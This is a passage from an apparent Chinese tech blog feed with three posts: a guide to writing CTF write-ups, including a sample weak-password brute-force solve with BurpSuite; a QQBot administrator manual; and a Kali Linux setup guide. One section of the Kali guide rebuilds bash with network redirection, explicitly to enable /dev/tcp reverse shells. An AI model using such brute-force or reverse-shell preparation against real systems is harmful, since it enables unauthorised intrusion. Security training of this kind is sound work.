        <content type="html"><![CDATA[<h2 id="什么是WP"><a href="#什么是WP" class="headerlink" title="什么是WP?"></a>什么是WP?</h2><p>​WP，全称是<code>WriteUp</code>，直译过来就是<code>把...整理成文</code>，我们通常理解为<code>记录了解题过程和思路的文档</code></p><hr><h2 id="为什么要写WP"><a href="#为什么要写WP" class="headerlink" title="为什么要写WP?"></a>为什么要写WP?</h2><ul><li>向赛事主办方证明该题目是自己解出的</li><li>一道题往往有不同解法，可以让师傅们相互学习，拓展知识</li><li>更好地整理思路</li><li>实力与努力的证明</li></ul><hr><h2 id="如何书写WP"><a href="#如何书写WP" class="headerlink" title="如何书写WP?"></a>如何书写WP?</h2><h3 id="包含的内容"><a href="#包含的内容" class="headerlink" title="包含的内容"></a>包含的内容</h3><p>​一个完整的WP往往包括了：</p><ul><li><p>题目名</p></li><li><p>解题思路</p></li><li><p>解题过程中用到的脚本代码</p></li><li><p>必要的截图</p><p>————</p></li></ul><p>​根据不同的情景或要求，还可能包含：</p><ul><li>WP所有者的信息</li><li>背景前言</li><li>拓展的知识点</li></ul><h3 id="格式的基本要求"><a href="#格式的基本要求" class="headerlink" title="格式的基本要求"></a>格式的基本要求</h3><p>​一般来说，<code>题目名</code>字体相对较大，<code>解题思路</code> <code>脚本代码</code> <code>截图</code>次之，一份WP中可以包含多个题目，相互之间最好空行以分隔；</p><p>​对于一份WP中具有多个题目的情况，需要按照题目类别归类放在一起，Misc题和Misc题放一起，Web题和Web题放一起；</p><p>​在保证WP完整详尽的基础上推荐进行美化便于阅读。</p><h3 id="编辑书写方式"><a href="#编辑书写方式" class="headerlink" title="编辑书写方式"></a>编辑书写方式</h3><p>​相较于Word文档，推荐使用<a href="https://markdown.com.cn/basic-syntax/">Makedown</a>语法进行编写，可以极大程度地提高美观程度，推荐软件Typora，下载链接在文章末尾</p><p>​以下是针对使用<a href="https://markdown.com.cn/basic-syntax/">Makedown</a>进行编写的简单说明，详细专业介绍请查看官方文档</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">若干个# + 空格 + 你的文字标题，字号随#数量减小而增大，最大为一级，最小为六级</span><br><span class="line"></span><br><span class="line">​```</span><br><span class="line">你的代码将代码规整放在一个方框中，指定了代码语言后还会有语法高亮</span><br><span class="line">​```</span><br><span class="line"></span><br><span class="line">---分割线</span><br></pre></td></tr></table></figure><h3 id="编写完成后"><a href="#编写完成后" class="headerlink" title="编写完成后"></a>编写完成后</h3><p>​在编写完你的WP后，请将其导出为PDF格式，一方面它便于传输，另一方面可以保护你的文档内容不被修改；</p><p>​对于Typora这个软件来说，依次点击<code>&quot;文件&quot;-&gt;&quot;导出&quot;-&gt;&quot;PDF&quot;-&gt;&quot;保存&quot;</code>即可将其保存在本地你的指定文件夹中，其他软件的导出方法请自行搜索；</p><p>​将导出的PDF文档重命名为正确合适的名称；</p><p>​至此恭喜你已经完成了WP的编写！</p><hr><h2 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h2><p>​如果还是不会书写WP，就请看看这一篇样例，以<code>WEB入门3-弱口令</code>为例</p><p>​</p><h4 id="某比赛WP"><a href="#某比赛WP" class="headerlink" title="某比赛WP"></a>某比赛WP</h4><p>​作者：BR</p><p>​排名：1</p><p>​得分：1000</p><h4 id="WEB入门3-弱口令"><a href="#WEB入门3-弱口令" class="headerlink" title="WEB入门3-弱口令"></a>WEB入门3-弱口令</h4><p>​开启实例，打开环境，发现一个登录框</p><p>​<img src="/../post_img/b4426b0652e050552f8fbcb99698f633/wp_0.png" alt="image-20241012215922985"></p><p>​题目提示到<code>用户名：admin</code>，但是没有告诉我们密码，经过几次尝试不行</p><p>​结合题目名称为<code>弱口令</code>，加上附件给了一个名为<code>1400.txt</code>的包含了很多字符串的文本文件，推测为弱密码登录爆破</p><p>​使用BurpSuite拦截抓包，将用户名设为<code>admin</code>，密码设为导入的文本文件</p><p><img src="/../post_img/b4426b0652e050552f8fbcb99698f633/wp_1.png" alt="image-20241012220716852"></p><p><img src="/../post_img/b4426b0652e050552f8fbcb99698f633/wp_2.png" alt="image-20241012220735899"></p><p>​点击开始攻击进行密码爆破，等待一段时间，出现响应体长度不同于其他响应体的信息，成功完成登录</p><p><img src="/../post_img/b4426b0652e050552f8fbcb99698f633/wp_3.png" alt="image-20241012220951699"></p><p>​同时获取到了flag：<code>XAUTCTF&#123;a5cec463-fd1e-4195-98db-668a99d730f6&#125;</code></p><hr><h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><ul><li><a href="https://www.alipan.com/s/oLV5MockxR2">Typora下载</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQBot管理员手册V1.0</title>
      <link href="/post/d79b03c7.html"/>
      <url>/post/d79b03c7.html</url>
      
        <content type="html"><![CDATA[<h2 id="基础说明"><a href="#基础说明" class="headerlink" title="基础说明"></a>基础说明</h2><p>​- By BR</p><p>​本项目基于NapCat+python3.10，是在<a href="https://github.com/MoXueYao/QQBot">QQBot</a>基础上的二次开发，存在个人魔改部分，可在Window及Linux上部署</p><p>​@信息，命令信息，文本信息等，每个信息之间是以一个空格分隔的</p><p>​普通用户权限为1，管理员权限为2，超级管理员权限为3</p><p>​作用范围：friend(仅私聊)，group(仅群聊)，public(私聊与群聊均可)</p><hr><h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><p>​配置文件位于<code>pkg/config.py</code></p><p>​配置包括</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;loop_interval&quot;</span>: <span class="number">3</span>,  <span class="comment"># 循环间隔时间(s)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;super_admin&quot;</span>: [<span class="number">1234567</span>],  <span class="comment"># 超级管理员QQ，权限等级3</span></span><br><span class="line"><span class="string">&quot;admin&quot;</span>: [<span class="number">12345678</span>],  <span class="comment"># 管理员QQ，权限等级2</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;command_prefix&quot;</span>: <span class="string">&quot;/&quot;</span>,  <span class="comment"># 命令前缀</span></span><br><span class="line"><span class="string">&quot;only_At&quot;</span>: <span class="literal">False</span>,  <span class="comment"># 是否仅允许被@时触发</span></span><br><span class="line"><span class="string">&quot;Bot_QQ&quot;</span>: <span class="number">123456</span>,  <span class="comment"># Bot的QQ(仅在only_At为True时生效)</span></span><br><span class="line"><span class="string">&quot;Bot_name&quot;</span>: <span class="string">&quot;Bot&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;group_limit&quot;</span>: <span class="literal">False</span>,  <span class="comment"># 是否对Bot的响应群聊进行限制</span></span><br><span class="line"><span class="string">&quot;group_list&quot;</span>: [],  <span class="comment"># 如果限制，允许的响应群聊</span></span><br></pre></td></tr></table></figure><p>​NapCatQQ配置</p><p>​将<code>NapCat\config\onebot11_你的qq号.json</code>中的内容改为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;network&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;httpServers&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;httpServer&quot;</span>,</span><br><span class="line">        <span class="string">&quot;enable&quot;</span>: true,</span><br><span class="line">        <span class="string">&quot;port&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">        <span class="string">&quot;host&quot;</span>: <span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;enableCors&quot;</span>: true,</span><br><span class="line">        <span class="string">&quot;enableWebsocket&quot;</span>: true,</span><br><span class="line">        <span class="string">&quot;messagePostFormat&quot;</span>: <span class="string">&quot;array&quot;</span>,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: false</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;httpSseServers&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;httpClients&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;httpClient&quot;</span>,</span><br><span class="line">        <span class="string">&quot;enable&quot;</span>: true,</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">        <span class="string">&quot;messagePostFormat&quot;</span>: <span class="string">&quot;array&quot;</span>,</span><br><span class="line">        <span class="string">&quot;reportSelfMessage&quot;</span>: false,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: false</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;websocketServers&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;websocketClients&quot;</span>: []</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;musicSignUrl&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;enableLocalFile2Url&quot;</span>: false,</span><br><span class="line">  <span class="string">&quot;parseMultMsg&quot;</span>: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="插件目录"><a href="#插件目录" class="headerlink" title="插件目录"></a>插件目录</h2><h3 id="about"><a href="#about" class="headerlink" title="about"></a>about</h3><h3 id="get-match"><a href="#get-match" class="headerlink" title="get_match"></a>get_match</h3><h3 id="just-group"><a href="#just-group" class="headerlink" title="just_group"></a>just_group</h3><h3 id="match-monitoring"><a href="#match-monitoring" class="headerlink" title="match_monitoring"></a>match_monitoring</h3><h3 id="praise"><a href="#praise" class="headerlink" title="praise"></a>praise</h3><h3 id="QQ-like"><a href="#QQ-like" class="headerlink" title="QQ_like"></a>QQ_like</h3><h3 id="time-message"><a href="#time-message" class="headerlink" title="time_message"></a>time_message</h3><h3 id="tongyi"><a href="#tongyi" class="headerlink" title="tongyi"></a>tongyi</h3><hr><h2 id="命令目录"><a href="#命令目录" class="headerlink" title="命令目录"></a>命令目录</h2><h3 id="help"><a href="#help" class="headerlink" title="&#x2F;help"></a>&#x2F;help</h3><ul><li><p>来源：系统命令</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/help</code></p></li><li><p>作用：查看当前环境下的命令目录</p></li></ul><h3 id="reload"><a href="#reload" class="headerlink" title="&#x2F;reload"></a>&#x2F;reload</h3><ul><li><p>来源：系统命令</p></li><li><p>作用范围：friend</p></li><li><p>权限要求：3</p></li><li><p>用法：<code>/reload</code></p></li><li><p>作用：重载所有插件</p></li></ul><h3 id="点赞"><a href="#点赞" class="headerlink" title="&#x2F;点赞"></a>&#x2F;点赞</h3><ul><li><p>来源：QQ_like插件</p></li><li><p>作用范围：friend</p></li><li><p>权限要求：2</p></li><li><p>用法：<code>/点赞 [subcommand] [arguments]</code></p></li><li><p>参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subcommand:</span><br><span class="line">    <span class="built_in">set</span> &lt;status&gt;          设置插件状态，<span class="string">&quot;True,true,1&quot;</span>表示启用，<span class="string">&quot;False,fasle,0&quot;</span>表示禁用</span><br><span class="line">    add &lt;QQ_id&gt;           添加待点赞QQ号</span><br><span class="line">    <span class="keyword">del</span> &lt;QQ_id&gt;           删除待点赞QQ号</span><br></pre></td></tr></table></figure></li><li><p>作用：明天晚上12点整为列表用户的名片点赞</p></li></ul><h3 id="比赛监听"><a href="#比赛监听" class="headerlink" title="&#x2F;比赛监听"></a>&#x2F;比赛监听</h3><ul><li><p>来源：match_monitoring插件</p></li><li><p>作用范围：friend</p></li><li><p>权限要求：2</p></li><li><p>用法：<code>/比赛监听 [subcommand] [arguments]</code></p></li><li><p>参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subcommand:</span><br><span class="line">    <span class="built_in">set</span> &lt;status&gt;          设置插件状态，<span class="string">&quot;True,true,1&quot;</span>表示启用，<span class="string">&quot;False,fasle,0&quot;</span>表示禁用</span><br><span class="line">    add &lt;QQ_group_id&gt;     添加通报群聊QQ号</span><br><span class="line">    <span class="keyword">del</span> &lt;QQ_group_id&gt;     删除通报群聊QQ号</span><br></pre></td></tr></table></figure></li><li><p>作用：监听GZCTF平台比赛实况，包括一血二血三血，题目上新，新增公告等的提示</p></li></ul><h3 id="查询比赛"><a href="#查询比赛" class="headerlink" title="&#x2F;查询比赛"></a>&#x2F;查询比赛</h3><ul><li><p>来源：get_match插件</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/查询比赛 [arguments]</code></p></li><li><p>参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arguments表示指定页码，默认为<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>作用：查询近期国内网安类比赛，消息来源：<a href="https://github.com/ProbiusOfficial/Hello-CTFtime">ProbiusOfficial&#x2F;Hello-CTFtime: 【Hello CTF】国内外赛事聚合 (github.com)</a></p></li></ul><h3 id="查询国外比赛"><a href="#查询国外比赛" class="headerlink" title="&#x2F;查询国外比赛"></a>&#x2F;查询国外比赛</h3><ul><li><p>来源：get_match插件</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/查询国外比赛 [arguments]</code></p></li><li><p>参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arguments表示指定页码，默认为<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>作用：查询近期国内网安类比赛，消息来源：<a href="https://github.com/ProbiusOfficial/Hello-CTFtime">ProbiusOfficial&#x2F;Hello-CTFtime: 【Hello CTF】国内外赛事聚合 (github.com)</a></p></li></ul><h3 id="响应群聊"><a href="#响应群聊" class="headerlink" title="&#x2F;响应群聊"></a>&#x2F;响应群聊</h3><ul><li><p>来源：just_group插件</p></li><li><p>作用范围：friend</p></li><li><p>权限要求：2</p></li><li><p>用法：<code>/响应群聊 [subcommand] [arguments]</code></p></li><li><p>参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subcommand:</span><br><span class="line">    <span class="built_in">set</span> &lt;status&gt;          设置插件状态，<span class="string">&quot;True,true,1&quot;</span>表示启用，<span class="string">&quot;False,fasle,0&quot;</span>表示禁用</span><br><span class="line">    add &lt;QQ_group_id&gt;     添加允许响应群聊</span><br><span class="line">    <span class="keyword">del</span> &lt;QQ_group_id&gt;     删除允许响应群聊</span><br></pre></td></tr></table></figure></li><li><p>作用：限制Bot能够响应的群聊，在允许响应群聊外的群聊，Bot将会无视其信息</p></li></ul><h3 id="ai"><a href="#ai" class="headerlink" title="&#x2F;ai"></a>&#x2F;ai</h3><ul><li><p>来源：tongyi插件</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/ai [subcommand]</code></p></li><li><p>参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subcommand:</span><br><span class="line">    cls          清除发出信息的用户与ai的聊天记录</span><br></pre></td></tr></table></figure></li><li><p>作用：用户层对于ai的管理</p></li></ul><h3 id="ai管理"><a href="#ai管理" class="headerlink" title="&#x2F;ai管理"></a>&#x2F;ai管理</h3><ul><li><p>来源：tongyi插件</p></li><li><p>作用范围：friend</p></li><li><p>权限要求：2</p></li><li><p>用法：<code>/ai管理 [subcommand] [arguments]</code></p></li><li><p>参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">subcommand:</span><br><span class="line">    <span class="built_in">set</span> &lt;status&gt;          设置插件状态，<span class="string">&quot;True,true,1&quot;</span>表示启用，<span class="string">&quot;False,fasle,0&quot;</span>表示禁用</span><br><span class="line">    add &lt;QQ_id&gt;       添加黑名单用户</span><br><span class="line">    <span class="keyword">del</span> &lt;QQ_id&gt;       删除黑名单用户</span><br><span class="line">    cls [QQ_id]  清除指定用户与ai的聊天记录(保留预设),未传入QQ_id参数则全清除</span><br><span class="line">    ccls [QQ_id]  清除指定用户与ai的聊天记录(不保留预设),未传入QQ_id参数则全清除</span><br><span class="line">    preset [<span class="built_in">set</span> &lt;preset_id&gt;]设置当前预设，若未传入<span class="built_in">set</span>命令，则展示当前使用预设及可选预设</span><br><span class="line">    show将当前存在会话的对话信息保存并以md文档发送给发出命令者</span><br></pre></td></tr></table></figure></li><li><p>作用：管理层对于ai的管理</p></li></ul><h3 id="关于"><a href="#关于" class="headerlink" title="&#x2F;关于"></a>&#x2F;关于</h3><ul><li><p>来源：about插件</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/关于</code></p></li><li><p>作用：展示Bot基本信息</p></li></ul><h3 id="夸夸"><a href="#夸夸" class="headerlink" title="&#x2F;夸夸"></a>&#x2F;夸夸</h3><ul><li><p>来源：praise插件</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/夸夸 [argumnets]</code></p></li><li><p>参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arguments表示对谁使用夸夸，如果不存在该参数，默认对使用命令者使用夸夸</span><br></pre></td></tr></table></figure></li><li><p>作用：从词库中随机抽取夸奖文案并回复</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 我爱发明 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> QQBot </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KaliLinux安装配置指南</title>
      <link href="/post/461f56d.html"/>
      <url>/post/461f56d.html</url>
      
        <content type="html"><![CDATA[<h1 id="KaliLinux安装"><a href="#KaliLinux安装" class="headerlink" title="KaliLinux安装"></a>KaliLinux安装</h1><p>​持续更新中~</p><h1 id="KaliLinux配置"><a href="#KaliLinux配置" class="headerlink" title="KaliLinux配置"></a>KaliLinux配置</h1><h2 id="更换国内软件源"><a href="#更换国内软件源" class="headerlink" title="更换国内软件源"></a>更换国内软件源</h2><p>​kali默认软件源安装可比较慢，推荐配置国内源提高速度</p><ol><li><code>su root</code> 进入root 模式</li><li><code>vim /etc/apt/sources.list</code> 编辑软件源配置文件</li><li>按 i 进入 vim 的编辑模式，用#将deb一行的内容注释掉，然后换成国内源地址</li><li>软件源(选择一个即可)</li></ol><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官方源(国内较慢)</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中科大源</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阿里云源</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清华大学源</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="comment"># 浙大源</span></span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="comment"># 东软大学源</span></span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新加坡kali源(国内较慢)</span></span><br><span class="line">deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib</span><br><span class="line">deb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 163 Kali源</span></span><br><span class="line">deb http://mirrors.163.com/debian wheezy main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy main non-free contrib</span><br></pre></td></tr></table></figure><ol start="5"><li>Esc，然后输入 wq 保存退出即可</li><li>使用<code>apt-get update</code>更新索引</li><li>使用<code>apt-get upgrade</code>更新软件</li></ol><h2 id="pip换源-清华源"><a href="#pip换源-清华源" class="headerlink" title="pip换源(清华源)"></a>pip换源(清华源)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/.pip 或 <span class="built_in">mkdir</span> -p ~/.config/pip</span><br><span class="line"><span class="built_in">cd</span> ~/.pip 或 <span class="built_in">cd</span> ~/.config/pip</span><br><span class="line">vim pip.conf</span><br></pre></td></tr></table></figure><p>修改pip.conf的内容为</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">index-url</span>=https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"> </span><br><span class="line"><span class="attr">timeout</span> = <span class="number">6000</span></span><br><span class="line"> </span><br><span class="line"><span class="section">[install]</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">trusted-host</span>=pypi.tuna.tsinghua.edu.cn</span><br><span class="line"> </span><br><span class="line"><span class="attr">disable-pip-version-check</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>其他源</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 豆瓣</span></span><br><span class="line">https://pypi.douban.com/</span><br><span class="line"><span class="comment"># 华中理工大学</span></span><br><span class="line">https://pypi.hustunique.com/</span><br><span class="line"><span class="comment"># 山东理工大学</span></span><br><span class="line">https://pypi.sdutlinux.org/</span><br><span class="line"><span class="comment"># 中国科学技术大学</span></span><br><span class="line">https://pypi.mirrors.ustc.edu.cn/</span><br><span class="line"><span class="comment"># 阿里云</span></span><br><span class="line">https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"><span class="comment"># 清华大学</span></span><br><span class="line">https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure><h2 id="Bash开启网络重定向选项"><a href="#Bash开启网络重定向选项" class="headerlink" title="Bash开启网络重定向选项"></a>Bash开启网络重定向选项</h2><p>​kalilinux预装的bash可能未开启bash的网络重定向功能，<code>-e</code>不能使用，反弹shell时也会提示<code>/dev/tcp</code>不存在，就没法利用bash反弹shell了，为了使用bash的网络重定向功能，需要重新编译bash并加上<code>–enable-net-redirections</code></p><ol><li>查询当前使用bash版本</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash --version</span><br></pre></td></tr></table></figure><ol start="2"><li>下载对应版本的bash</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://ftp.gnu.org/gnu/bash/bash-5.1.16.tar.gz</span><br></pre></td></tr></table></figure><ol start="3"><li>解压并进入到解压后的目录</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf bash-5.1.16.tar.gz</span><br><span class="line"><span class="built_in">cd</span> bash-5.1.16</span><br></pre></td></tr></table></figure><ol start="4"><li>配置</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/bash --enable-net-redirections</span><br></pre></td></tr></table></figure><ol start="5"><li>编译和安装</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure><ol start="6"><li>更换使用的shell并重启</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">echo</span> <span class="string">&quot;/usr/local/bash/bin/bash&quot;</span> &gt;&gt; /etc/shells</span><br><span class="line"><span class="built_in">sudo</span> chsh -s /usr/local/bash/bin/bash  <span class="comment"># 这一步如果失败就手动修改/etc/passwd中的shell路径</span></span><br><span class="line"><span class="built_in">sudo</span> reboot</span><br></pre></td></tr></table></figure><h1 id="其他软件的安装"><a href="#其他软件的安装" class="headerlink" title="其他软件的安装"></a>其他软件的安装</h1><h2 id="xrdp"><a href="#xrdp" class="headerlink" title="xrdp"></a>xrdp</h2><p>​官方给出的xrdp配置脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[i] Updating and upgrading Kali (this will take a while)&quot;</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get dist-upgrade -y</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[i] Installing Xfce4 &amp; xrdp (this will take a while as well)&quot;</span></span><br><span class="line">apt-get install -y kali-desktop-xfce xorg xrdp</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[i] Configuring xrdp to listen to port 3390 (but not starting the service)&quot;</span></span><br><span class="line">sed -i <span class="string">&#x27;s/port=3389/port=3390/g&#x27;</span> /etc/xrdp/xrdp.ini</span><br></pre></td></tr></table></figure><p>​将其保存为<code>xrdp-install.sh</code>文件后，执行<code>sudo bash xrdp-install.sh</code>即可</p><p>​以下为一些可能用到的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 